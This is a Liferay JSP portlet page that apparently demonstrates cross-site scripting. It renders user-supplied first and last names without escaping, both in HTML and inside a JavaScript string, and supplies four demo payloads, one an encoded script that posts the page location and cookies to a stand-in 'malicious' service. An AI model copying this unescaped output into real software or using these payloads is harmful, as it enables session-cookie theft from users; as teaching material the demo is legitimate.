<%@ include file="./init.jsp" %>

<%
String firstName = GetterUtil.getString(renderRequest.getAttribute("firstName"));
String lastName = GetterUtil.getString(renderRequest.getAttribute("lastName"));
%>
<liferay-portlet:actionURL
	varImpl="submitActionURL" name="/submit/action" />

<aui:form name="fm" action="<%= submitActionURL.toString() %>">
	<c:if test="<%= Validator.isNotNull(firstName) || Validator.isNotNull(lastName) %>">
		<p>Hello, <%= firstName %> <%= lastName %></p>
	</c:if>
	<aui:row>
		<aui:col>
			<aui:input type="text" name="firstName" label="first-name" value="<%= firstName %>"/>
		</aui:col>	
	</aui:row>
	<aui:row>
		<aui:col>
			<aui:input type="text" name="lastName" label="last-name" value="<%= lastName %>"/>
		</aui:col>
	</aui:row>
	<aui:button-row>
		<aui:button type="submit" name="submit" value="submit"/>
	</aui:button-row>

	<aui:button-row>
		<% 
		for (int i = 0 ; i < 4; i++) {
		%>
			<aui:a href="#" cssClass="btn btn-danger btn-default" label="<%= "xss-injection-demo-" + (1+i) %>" 
				onclick="<%= "xssInjectionSuggestions(" + i +")" %>" />
		<%
		}
		%>
	</aui:button-row>
</aui:form>

<aui:script>
	var firstName = '<%= firstName %>';
	var lastName = '<%= lastName %>';
	var lastNameField = $("#<portlet:namespace/>lastName");
	console.log("firstName: " + firstName);
	console.log("lastName: " + lastName);
	var suggestions = [
		"'+eval(unescape(\"alert%28document.cookie%29\"))+'",
		"< img src=# onerror=javascript:alert(String.fromCharCode(88,83,83)) >< /img >",
		"< script > alert('remove-spaces-and-see-what-happens-after-submit') < / script >",
		"'+eval(unescape(\"var%20url%20%3D%20%22http%3A//127.0.0.1/malicious/service%22%3B%20%24.post%28url%2CJSON.stringify%28%7B%22location%22%3A%20window.location%2C%20%22cookies%22%20%3A%20document.cookie%7D%29%29\"))+'"
	];
	function xssInjectionSuggestions(index) {
		event.preventDefault();
		lastNameField.val(suggestions[index]);
	}
</aui:script>